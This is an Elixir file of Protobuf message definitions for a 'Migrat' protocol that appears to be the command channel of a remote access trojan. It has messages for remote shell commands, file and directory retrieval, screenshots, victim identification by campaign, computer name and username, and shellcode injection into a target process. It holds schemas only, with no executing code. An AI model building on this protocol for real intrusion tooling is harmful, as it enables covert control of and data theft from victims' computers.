defmodule Migrat.ShellCommand do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          command: String.t()
        }

  defstruct command: ""

  field :command, 1, type: :string
end
defmodule Migrat.ShellResponse do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          output: String.t()
        }

  defstruct output: ""

  field :output, 1, type: :string
end
defmodule Migrat.GetFile do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          path: String.t()
        }

  defstruct path: ""

  field :path, 1, type: :string
end
defmodule Migrat.File do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          path: String.t(),
          data: binary
        }

  defstruct path: "",
            data: ""

  field :path, 1, type: :string
  field :data, 2, type: :bytes
end
defmodule Migrat.HeartbeatResponse do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          keep_open: boolean
        }

  defstruct keep_open: false

  field :keep_open, 1, type: :bool, json_name: "keepOpen"
end
defmodule Migrat.Ident do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          id: String.t(),
          campainId: String.t(),
          computerName: String.t(),
          processname: String.t(),
          username: String.t()
        }

  defstruct id: "",
            campainId: "",
            computerName: "",
            processname: "",
            username: ""

  field :id, 1, type: :string
  field :campainId, 2, type: :string
  field :computerName, 3, type: :string
  field :processname, 4, type: :string
  field :username, 5, type: :string
end
defmodule Migrat.TakeScreenshot do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          screen: integer
        }

  defstruct screen: 0

  field :screen, 1, type: :int32
end
defmodule Migrat.Screenshot do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          time: String.t(),
          data: binary
        }

  defstruct time: "",
            data: ""

  field :time, 1, type: :string
  field :data, 2, type: :bytes
end
defmodule Migrat.GetDirectory do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          path: String.t()
        }

  defstruct path: ""

  field :path, 1, type: :string
end
defmodule Migrat.FileInfo do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          name: String.t(),
          size: integer,
          directory: boolean,
          owner: String.t()
        }

  defstruct name: "",
            size: 0,
            directory: false,
            owner: ""

  field :name, 1, type: :string
  field :size, 2, type: :int64
  field :directory, 3, type: :bool
  field :owner, 4, type: :string
end
defmodule Migrat.GetDirectoryResponse do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          basepath: String.t(),
          files: [Migrat.FileInfo.t()]
        }

  defstruct basepath: "",
            files: []

  field :basepath, 1, type: :string
  field :files, 2, repeated: true, type: Migrat.FileInfo
end
defmodule Migrat.Interpret do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          type: integer,
          data: String.t()
        }

  defstruct type: 0,
            data: ""

  field :type, 1, type: :int32
  field :data, 2, type: :string
end
defmodule Migrat.InterpretResponse do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          type: integer,
          data: String.t()
        }

  defstruct type: 0,
            data: ""

  field :type, 1, type: :int32
  field :data, 2, type: :string
end
defmodule Migrat.InjectShellcode do
  @moduledoc false
  use Protobuf, syntax: :proto3

  @type t :: %__MODULE__{
          target: String.t(),
          shellcode: binary
        }

  defstruct target: "",
            shellcode: ""

  field :target, 1, type: :string
  field :shellcode, 2, type: :bytes
end
